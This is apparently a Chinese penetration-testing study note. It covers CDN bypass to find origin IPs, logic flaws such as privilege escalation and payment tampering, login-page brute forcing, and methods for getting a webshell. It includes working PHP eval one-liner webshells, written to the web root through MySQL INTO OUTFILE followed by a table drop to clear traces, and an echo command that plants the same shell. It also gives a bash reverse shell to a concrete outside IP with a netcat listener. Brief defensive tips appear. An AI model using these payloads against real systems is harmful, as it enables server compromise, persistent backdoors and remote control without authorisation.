或者在目标段比较大的情况下，借助类似nmap的工具批扫描对应IP段中所有开了80、443、8080端口的 IP，然后逐个尝试IP访问，观察响应结果是否为目标站点。

## 🦓绕过CDN机制：

### 方法一：历史DNS记录查询：

**1、查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：**

> DNS查询 ：https://dnsdb.io/zh-cn
> 微步在线：[https://x.threatbook.cn](https://x.threatbook.cn/)
> 在线域名信息查询 ：http://toolbar.netcraft.com/site_report?url=
> DNS、IP等查询 ：http://viewdns.info/
> CDN查询IP：https://tools.ipip.net/cdn.php

**2、利用SecurityTrails平台，攻击者就可以精准的找到真实原始IP。
他们只需在搜索字段中输入网站域名，然后按Enter键即可，这时“历史数据”就可以在左侧的菜单中找到。**

> https://securitytrails.com/domain/oldboyedu.com/dns
> 除了过去的DNS记录，即使是当前的记录也可能泄漏原始服务器IP。
> 例如，MX记录是一种常见的查找IP的方式。如果网站在与web相同的服务器和IP上托管自己的邮件服务器，那么原始服务器IP将在MX记录中。

**3、观看ip变化**

> http://toolbar.netcraft.com/site_report?url=www.aabbc.com

### **方法二：查询子域名**

1. 微步在线：
   [https://x.threatbook.cn](https://x.threatbook.cn/)
2. Dnsdb查询法：
   https://dnsdb.io/zh-cn/
3. Google 搜索：
   Google site:baidu.com -www就能查看除www外的子域名
4. 各种子域名扫描器
5. 网络空间引擎搜索法：
   常见的有以前的钟馗之眼，shodan，fofa搜索。
6. 利用SSL证书寻找真实原始IP
   只显示有效证书的查询参数为：tags.raw：trusted
   https://censys.io/certificates?q=parsed.names%3Aaabbcc.com+and+tags.raw%3Atrusted
   Censys将向你显示符合上述搜索条件的所有标准证书，以上这些证书是在扫描中找到的。
   要逐个查看这些搜索结果，攻击者可以通过单击右侧的“Explore”，打开包含多个工具的下拉菜单。What's using this certificate? > IPv4 Hosts
7. 使用国外主机解析域名
   国内很多CDN厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。
8. 方法网站漏洞查找
   1）目标敏感文件泄露，例如：phpinfo之类的探针、"info.php", "phpinfo.php", "test.php", "l.php"、GitHub信息泄露等。
   2）查看漏洞扫描报警信息，手工造成页面报错
   3）XSS盲打，命令执行反弹shell，SSRF等。
   4）无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。
9. 网站邮件订阅查找
   RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。
10. F5 LTM解码法
    当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip
11. 通过信息报错或访问相关测试页面（）

# 逻辑漏洞

可安装webbug3.0系统模拟攻击

## 逻辑漏洞基础信息

之所以称为逻辑漏洞，是因为代码之后是人的逻辑，人更容易犯错，是编写完程序后随着人的思维逻辑产生的不足。
sql注入、xss等漏洞可以通过安全框架等避免，这种攻击流量非法，对原始程序进行了破坏，防火墙可以检测
而逻辑漏洞是通过合法合理的方式达到破坏，分别为不安全对象引用和功能级别访问控制缺失。

- 不安全对象引用，指的是平行权限的访问控制缺失，
  比方说，A 和 B 两个同为一个网站的普通用户，他们之间的个人资料是相互保密的，A用户的个人资料可以被 B 用户利用程序访问控制的缺失恶意查看，由于 A 用户和 B用户之间是一个同级的账号，因此称为平行权限的访问控制缺失。
- 功能级别访问控制缺失，指的是垂直权限的访问控制缺失
  比方说，A 账号为普通账号、B 账号为管理员账号，B 账号的管理页面时必须是以管理员权限登录后方可查看，但 A 账号可通过直接输入管理页面 URL 的方式绕过管理员登录限制查看管理页面，由于 A用户和 B用户的权限是垂直关系，因此称为垂直权限的访问控制缺失。
  该类型属于业务设计缺陷的安全问题，因此传统的扫描器是无法发现的，只能通过手工的渗透测试去进行检查。在金融平台中以平行权限的访问控制缺失较为常见。

建议在乌云镜像站多看看别人挖掘逻辑漏洞的过程

### 常见的逻辑漏洞：

1. 越权修改
2. 越权查询
3. 验证码回传
4. 未进行登陆凭证验证
5. 订单金额任意修改
6. 密码重置
7. 突破限制等

### 挖掘逻辑漏洞的环节：

把握住传参就能把握住逻辑漏洞的命脉

1. 确定业务流程
2. 寻找流程中可以被操控的环节
3. 分析可被操控环节中可能产生的逻辑问题
4. 尝试修改参数触发逻辑问题

## 1️⃣越权访问

越权访问（Broken Access Control，简称BAC）是Web应用程序中一种常见的漏洞，在实际的代码审计中，这种漏洞往往很难通过工具进行自动化监测，因此在实际应用中危害很大。

### 原理说明

如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了不合理的权限校验规则导致的。
一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。
如果有waf的时候,优先考虑越权漏洞和逻辑漏洞

### 1、水平越权：

**权限类型不变，权限ID改变**

水平越权访问是一种【基于数据的访问控制】设计缺陷引起的漏洞。由于服务器端在接收到请求数据进行操作时没有判断数据的所属人/所属部门而导致的越权数据访问漏洞。

水平越权测试方法：主要通过看看能否通过A用户操作影响到B用户

### 2、垂直越权：

**权限ID不变，权限类型改变**

垂直越权是一种【基于URL的访问控制】设计缺陷引起的漏洞，又叫做权限提升攻击。

垂直越权测试思路：看看低权限用户是否能越权使用高权限用户的功能，比如普通用户可以使用管理员的功能。
先抓包高权限用户的某一操作，在抓包低权限用户包，将低权限用户cookie等复制到高权限包中，看能否完成同样的操作

### 真实案例：XX网参数越权

------

问题描述：测试过程中发现，用户在“地址管理”功能模块可越权查看任意收货信息，造成用户敏感信息泄露。

1、在地址管理中，选择“修改”，此时用抓包工具截断GET请求：

```
#抓包数据链接为：
http://www.XXXX.cn/index.php?app=treasure&mod=Order&act=findId&address_id=1111
#将address_id参数值替换为任意数值如2222：
#提交后发现返回了对应用户的收货信息
```

### 越权漏洞突破思路

1. 一般管理页面可能存在越权漏洞
   如果是白盒测试的话
   找到admin相关 需要管理员账号才可以访问的文件
   针对于前端绕过 访问该目录，可能会有一个js拦截，我们利用浏览器隐私安全性设置找到javascrip禁用 添加网站，再次进入可能会成功
   针对于后端绕过
   对于没有判断登录状态refer或者判断不标准，抓包修改为合法的refer就可以绕过
2. 有的对于用户管理的地方可能有，例如更改用户收货地址等
   先用自己的账号登录，之后抓包，将id等改变一下，查看返回值验证
3. 有时候通过将cookie修改为他人的，也可以实现越权
4. 参数也可能有越权漏洞，例如订单编号等等
5. 注册过程中，输入已经注册过的邮箱，在相应信息中可能有返回信息的
6. 还有修改密码如果没有对手机号位数限制（数字位数，或者空格等特殊符号）也可能有漏洞

小结：在找越权的时候，对参数要有很强的关注，可以每一个都试一试

## 2️⃣交易支付中的逻辑问题：

------

### 支付的逻辑漏洞的一般思路

一种是少充多得，比如充值100元时通过篡改金额改成10元，最终充值完毕后账户变成了100元，而实际付款却只有10元；
一种是绕过活动页金额限制，比如很多公司做活动强制用户充值金额不能低于10000，而通过拦截修改金额，可以充值任意金额。

一般购物流程：

1. 挑选商品加入购物车
2. 确认购物车信息
3. 输入物流及收货人信息
4. 确认订单进入支付环节
5. 交易成功等待发货

购物流程中可能的逻辑问题：

1. 加入购物车时是否可以修改购买数量为负数,商品价格是否可以修改.
2. 确认购物车信息时是否可以修改商品数量为负数,是否存在折扣限制突破问题,是否可以修改商品总金额.
3. 输入物流信息时是否可以控制运费,如果可以,尝试修改为负数.
4. 确认订单后跳转支付接口时是否可以修改支付金额,可否不支付直接跳转到交易成功环节.

### 预防思路：

------

增加多重检验，订单较大时增加人工审核。

### 实案例：信用卡还款服务费被绕过

------

问题分析：测试发现，微钱包信用卡还款功能处存在服务费可绕过漏洞，测试过程如下：

1、选择信用卡还款功能，填写相关还款数值后，截断信用卡还款GET请求，将f参数值修改为1：

2、提交修改后的请求，页面返回成功：

## 3️⃣密码修改逻辑漏洞：

重置密码对一个系统来说是非常重要的存在，所以存在的问题也是非常致命。

1. 用户在重置密码页面，通过修改用户ID对所改用户密码进行重置；
2. 对密码重置页面验证码绕过，然后爆破进行等。

### 密码修改逻辑漏洞验证

![mark](http://noah-pic.oss-cn-chengdu.aliyuncs.com/pic/20210728/203549580.png)

- 首先走一遍正常的密码修改流程,把过程中所有环节的数据包全部保存.
- 分析流程中哪些步骤使用了哪些身份认证信息,使用了哪些认证方法.
- 分析哪个步骤是可以跳过,或者可以直接访问某个步骤.
- 分析每个认证方法是否存在缺陷,可否越权
- 首先尝试正常密码找回流程,选择不同找回方式,如邮箱,手机,密码提示问题等.
- 分析各种找回机制所采用的验证手段,如验证码的有效期,有效次数,生成规律,是否与用户信息相关联等.
- 抓取修改密码步骤的所有数据包,尝试修改关键信息,如用户名,用户ID,邮箱地址,手机号码等。详细看以下案例：

> http://www.wooyun.org/bugs/wooyun-2010-011435
> http://www.wooyun.org/bugs/wooyun-2010-08573
> http://www.wooyun.org/bugs/wooyun-2010-012365
> http://www.wooyun.org/bugs/wooyun-2010-021818
> http://www.wooyun.org/bugs/wooyun-2010-020625
> http://www.wooyun.org/bugs/wooyun-2010-020588
> http://www.wooyun.org/bugs/wooyun-2010-019769
> http://www.wooyun.org/bugs/wooyun-2010-018722

### 预防思路：

系统后台在重置密码页面验证是否为本用户等。

## 4️⃣验证码回传：

### 漏洞原因

这个漏洞主要是发生在前端验证处，只要拦截数据包就可以获取敏感信息，并且经常发生的位置在：账号密码找回、账号注册、支付订单等。验证码主要发送途径邮箱邮件 、手机短信。黑客只需要抓取Response数据包便知道验证码是多少。

### 预防思路：

response数据内不包含验证码，验证方式主要采取后端验证，但是缺点是服务器的运算压力也会随之增加；要进行前端验证的话使用加密进行。

## 5️⃣接口无限制枚举：

有些关键性的接口因为没有做验证或者其它预防机制，容易遭到枚举攻击。

### 真实案例：用户激活邮件炸弹攻击

问题描述：测试发现，用户使用邮箱注册时，发送激活邮件功能可进行邮件炸弹攻击。测试过程如下：

1. 用户在激活账号过程中选择“重新发送”：
2. 将GET请求中的uid参数值为其他uid（需要此uid的用户也使用邮箱注册）：
3. 重放此数据包，可形成邮件炸弹攻击，响应包中提示发送成功：

### 防范措施：

1. 使用最小权限原则对用户进行赋权;
2. 永远不要相信来自用户的输入，使用合理（严格）的权限校验规则;
3. 使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;
4. cookie中设定多个验证，比如自如APP的cookie中，需要sign和ssid两个参数配对，才能返回数据。
5. 用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。
6. 用户的cookie的生成过程中最好带入用户的密码，一旦密码改变，cookie的值也会改变。
7. cookie中设定session参数，以防cookie可以长时间生效。

## 6 逻辑漏洞导致的问题

### 业务安全问题

一些生产环境中可能出现的实际问题，我认为这不只是渗透测试工程师需要针对的，也是一些开发人员需要意识到的

### 账户安全

盗号、撞库等身份盗用问题
“撞库”攻击的形式

- 尝试登录大量【用户名+密码】组合
- 利用已泄露的多家网站用户数据库
- “盗号”产生的风险
- 用户隐私受影响
- 账户资金受影响
- 企业投诉和赔付率上升

### 资源滥用

1. 刷单/恶意下单
   供应商刷单赚取信用
   竞争对手互相下单
   报复性下单
2. 控制库存影响正常销售
   自动加购物车，自动下单
   购物车过期后，重复上一步骤
   正常用户不能购买
   企业商品无法售出
3. 恶意调用短信发送接口
   封装多个网站短信发送接口为一个API
   向指定手机发送短信炸弹，强制对方关机
   企业遭受客户投诉导致短信通道被迫关停
4. 注册检查薄弱被利用接口
   利用简单的注册判断接口，检查全国手机号是否在网站注册
   放大这个请求，结果是灾难……为盲目“撞库”提前筛选用户名
5. 恶意注册产生“马甲”用户
   抢占正常用户资源
   影响企业营销效果
   产生虚假数据
   隐藏的“炸弹”

# 登录页面渗透测试思路与总结

- [登录页面渗透测试思路与总结](https://www.kancloud.cn/noahs/src_hacker/2395047#_0)

- - [扫描器扫描](https://www.kancloud.cn/noahs/src_hacker/2395047#_6)

  - [明文传输/用户名可枚举/爆破弱口令](https://www.kancloud.cn/noahs/src_hacker/2395047#_11)

  - - [明文传输](https://www.kancloud.cn/noahs/src_hacker/2395047#_13)
    - [用户名可枚举](https://www.kancloud.cn/noahs/src_hacker/2395047#_17)
    - [爆破弱口令](https://www.kancloud.cn/noahs/src_hacker/2395047#_21)

  - [关键位置扫描](https://www.kancloud.cn/noahs/src_hacker/2395047#_30)

  - - [目录扫描](https://www.kancloud.cn/noahs/src_hacker/2395047#_32)
    - [JS扫描](https://www.kancloud.cn/noahs/src_hacker/2395047#JS_43)
    - [nmap扫描](https://www.kancloud.cn/noahs/src_hacker/2395047#nmap_48)

  - [框架与中间件漏洞](https://www.kancloud.cn/noahs/src_hacker/2395047#_53)

你一个登陆网站页面，没有测试账号，让你自己进行渗透测试，一开始经验不足的话，可能会无从下手。今天就来简单说一下如何在只有一个登陆页面的情况下，来进行渗透测试。

## 扫描器扫描

在条件允许的情况下，拿出我们的扫描器来进行扫描，目前最常用的就是AWVS、Nessus、Appscan
或者随便输入用户名密码验证码登录，抓包，放在记事本里，`sqlmap -r`跑一下，级别调高一点

## 明文传输/用户名可枚举/爆破弱口令

### 明文传输

做渗透测试中，最常见的就是明文传输，明文传输在网站上随处可见，除了银行网站，很有可能每一个密码都是经过特殊加密然后再进行传输的。

### 用户名可枚举

此漏洞存在主要是因为页面对所输入的账号密码进行的判断所回显的数据不一样，我们可以通过这点来进行用户名的枚举，然后通过枚举后的账户名来进行弱口令的爆破。防御手段的话仅需要将用户名与密码出错的回显变成一样即可，例如用户名或密码出错。

### 爆破弱口令

弱口令可以说是渗透测试中，最最常见，也是危害“最大”的一种漏洞，因为毫无技术性，毫无新意，但是却充满了“破坏性”，尤其是在内网环境中，弱口令更是无处不在。
Web页面最常用的爆破工具为Burp，我们通常使用Nmap扫描也可能扫出其他端口存在，例如3389，SSH等。

**工具**

用Burp定制化字典进行爆破，定制化生成字典： http://tools.mayter.cn/

## 关键位置扫描

### 目录扫描

我们可以多级别扫描，再枚举子目录的目录，很多时候可以找到突破口

```
#工具
DirSearch:https://github.com/maurosoria/dirsearch
7kbscan:
破壳:
御剑：https://github.com/52stu/-
```

### JS扫描

有时候我们可以在JS文件中找到平时看不到的东西，例如重置密码的JS，发送短信的JS，都是有可能未授权可访问的。
JS扫描的话推荐使用 JSFind：https://github.com/Threezh1/JSFinder

### nmap扫描

获取网站的端口信息，端口对应信息需要熟记
在扫描目录与JS这块，要注意多次爆破，遍历访问多级域名的目录与JS

## 框架与中间件漏洞

寻找CMS，或者网页框架，以及某些厂商的服务存在漏洞，wappalyzer浏览器插件插件
致远A8-getshell： https://www.cnblogs.com/dgjnszf/p/11104594.html
Thinkphp： https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection
Struts2: https://github.com/HatBoy/Struts2-Scan
weblogic: https://github.com/rabbitmask/WeblogicScan
以及各大Java反序列化漏洞等等

# 获取Webshell思路总结

## 1️⃣CMS获取webshell方法：

### 1、什么是CMS?

CMS系统指的是内容管理系统。已经有别人开发好了整个网站的前后端，使用者只需要部署cms，然后通过后台添加数据，修改图片等工作，就能搭建好一个的WEB系统。

### 2、如何查看CMS相关信息？

1. 如果已经攻破后台，那么进入后台之后CMS系统有可能直接显示
2. 很多网站都会在网站的最下方信息中显示CMS版本信息
3. 通过web指纹识别扫描器扫描
   常用的为御剑WEB指纹识别系统
4. 通过浏览器的插件查看指纹信息
   火狐和Google推荐用wappalyzer

### 3、如何获取CMS的webshell?

找到网站使用的cms版本信息后，通过搜索引擎搜索，就可以得到相关版本获取webshell的方法

搜索关键字如：“wordpress拿webshell”。

## 2️⃣非CMS获取webshell：

更多的时候企业并不使用开源的CMS，而是选择自己开发源代码，这里的思路分为有权限和无权限两方面来分析

### 一、有管理权限的情况：

是指前期通过其他方法，已经破解了管理后台功能，可以使用管理后台的情况

#### **㈠、通过正常上传一句话小马获取webshell**

1. 检查网站是否过滤上传文件后缀格式，如果未过滤直接上传一句话小马即可。
2. 找到网站默认配置，将一句话小马插入配置中
   因为有些网站没有对配置参数进行过滤，所以配置中的小马被读取后，就可能被连接

建议先下载该站源码，进行查看源码过滤规则，以防插马失败。
插马失败很有可能会导致网站被你的小马中没有闭合标签导致网站出错。注意要闭合原有的代码，保证语法正确，以免程序运行出错。

#### **㈡、利用后台数据库备份获取webshell**

一般网站都不允许上传脚本类型文件，如 asp、php、jsp、aspx等文件。但一般后台都会有数据库备份功能。步骤如下

1. 上传允许格式的小马(如图片马)
2. 找到文件上传后的文件路径
3. 通过数据库备份，指定备份源文件与与备份后格式。

如果后台限制了备份路径，可以尝试F12修改文本框元素

#### ㈢、通过花样上传一句话小马获取Webshell

使用BurpSuite 工具，%00截断、特殊名文件名绕过、文件名大小写绕过、黑白名单绕过等等，想尽一切办法就是要上传一句话木马，通过各种变形，万变不离其宗，换汤不换药。

#### ㈣、通过编辑模块、标签等拿WebShell

①通过对网站的**模块**进行编辑写入一句话，然后生成脚本文件拿WebShell

②通过将木马添加到压缩文件，把名字改为**网站模板类型**，上传到网站服务器，拿WebShell

#### ㈤、SQL命令获取

有一定的数据库权限的情况下，通过向数据库表写入马，然后备份该表为脚本文件的方式进行
**大致步骤：**

1. 创建表
2. 将一句话写入刚创建的表中
3. 查询一句话所在表到文件，成功将一句话写入文件

第一种方法：

```
CREATE TABLE `mysql`.`best` (`best1` TEXT NOT NULL );  
#将一句话木马插入到mysql库best表best1字段
INSERT INTO `mysql`.`best` (`best1` ) VALUES ('<?php @eval($_POST[password]);?>');
#查询这个字段导出到网站的文件中
SELECT `best1` FROM `best` INTO OUTFILE 'd:/wamp/www/best.php';
#把痕迹清除
DROP TABLE IF EXISTS `best`;
```

第二种方法：
优先推荐，简单明了，且避免了误删别人的数据！

```
#直接将查询出来的语句写入文件
select '<?php @eval($_POST[pass]);?>'INTO OUTFILE 'd:/wamp/www/best3.php'
```

#### ㈥、利用解析漏洞拿WebShell

```
1）IIS5.x / 6.0 解析漏洞
2）IIS 7.0 / IIS 7.5 / Nginx <8.03 畸形解析漏洞
3）Nginx < 8.03 空字节代码执行漏洞
4）Apache 解析漏洞
```

其他的还有命令执行漏洞，反序列化漏洞等

#### ㈦、利用编辑器漏洞拿WebShell

利用网站的编辑器上传木马，搜索已知的编辑器漏洞，常见的编辑器有 fckeditor、ewebeditor、cheditor等，有时候没有管理员权限也可以拿下webshell。

#### ㈧、文件包含拿WebShell

1. 首先需要存在文件包含漏洞
2. 先将WebShell 改为txt格式文件上传
3. 然后上传一个脚本文件包含该txt格式文件
4. 通过这种方式，可绕过WAF拿WebShell

#### ㈨、上传其它脚本类型拿WebShell

1. 此类型用于一台服务器具有多个网站
   a网站是asp的站，b可能是php的站，分别限制了asp和php文件的上传，可以尝试向A上传php的脚本，来拿Shell
2. 也可以尝试将脚本文件后缀名改为asa 或者在后面直接加个点（.）如"xx.asp."， 来突破文件类型限制进行上传拿WebShell

#### ㈩、修改网站上传类型配置来拿WebShell

某些网站，在网站上传类型中限制了上传脚本类型文件，我们可以去添加上传文件类型如添加asp | php | jsp | aspx | asa 后缀名来拿WebShell

### 二、非管理权限

------

#### ㈠、SQL注入漏洞

前提条件，具有足够权限，对写入木马的文件夹有写入权限，知道网站绝对路径

①可以通过log 备份、差异备份拿WebShell
②可以通过`into outfile`,`into outfile`函数(写入函数)将一句话木马写入，拿WebShell。
③利用phpmyadmin 将木马导出，拿WebShell
④利用连接外连的数据库拿WebShell

```
 1. 要有file_priv权限
 2. 知道文件绝对路径 
 3. 能使用union 
 4. 对web目录有读权限
 5. 若过滤了单引号，则可以将函数中的字符进行hex编码 
```

#### ㈡、xss和sql注入联合利用

有些输入框对一些符号过滤不严密（如<>，所以一般存在xss的地方就可以这么利用）我们可以在这里输入一句话`<?php @eval($_POST['CE']);?>`，之后再用数据库注入，查询到文件into file成功插入一句话木马

#### ㈢、IIS写权限拿WebShell

有些网站的管理员在配置网站权限的时候疏忽，导致我们有写权限，这种漏洞需要用工具来利用，已经很少见了，有专门的利用工具（桂林老兵）。
原理是通过找到有IIS 写入权限的网站（开启WebDeV），PUT进去一个.txt 格式的文件，目录必须有刻写的权限，如 image 文件夹，然后通过move 方法，把txt 格式的木马用move 成脚本格式。

#### ㈣、远程命令执行拿WebShell

在有php代码执行漏洞,例如一些框架漏洞的时候可以通过执行一些系统命令进行拿WebShell。执行命令行命令“写入如下内容到文件，会自动将创建木马文件并将一句话木马写入其中，使用菜刀连接即可。

```
echo ?php "@eval($_POST['CE']);?>" > x.php 
```

#### ㈤、头像上传拿WebShell

大概思路：
①将大马放在文件夹中
②将文件夹压缩成压缩文件（zip）
③正常上传一个头像并且抓包
④将数据包中图片头像的内容部分删掉
⑤重新写入文件内容，将压缩文件写入到原本图片的位置
⑥上传，之后返回包中会告诉我们绝对路径

# 反弹shell

[反弹Shell，看这一篇就够了](https://xz.aliyun.com/t/9488)

监控：`nc -lvnp 端口号`

`nc`: Netcat 命令的缩写。 - `-l`: 表示监听模式，用于在本地主机上创建一个监听服务器。 - `-v`: 表示详细模式，启用详细的输出，让你能够看到更多关于连接和数据传输的信息。 - `-n`: 表示不进行主机名解析，只显示 IP 地址。 - `-p <port>`: 指定要监听的端口号。

被监控：`bash -i >& /dev/tcp/47.93.163.187/8087 0>&1`



# 参考链接

[web安全学习笔记](https://websec.readthedocs.io/zh/latest/index.html)

[白帽与安全](https://www.kancloud.cn/noahs/src_hacker/2120641)

[github博客](https://github.com/jas502n/sangfor/blob/master/1earn/Security/RedTeam/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87.md)
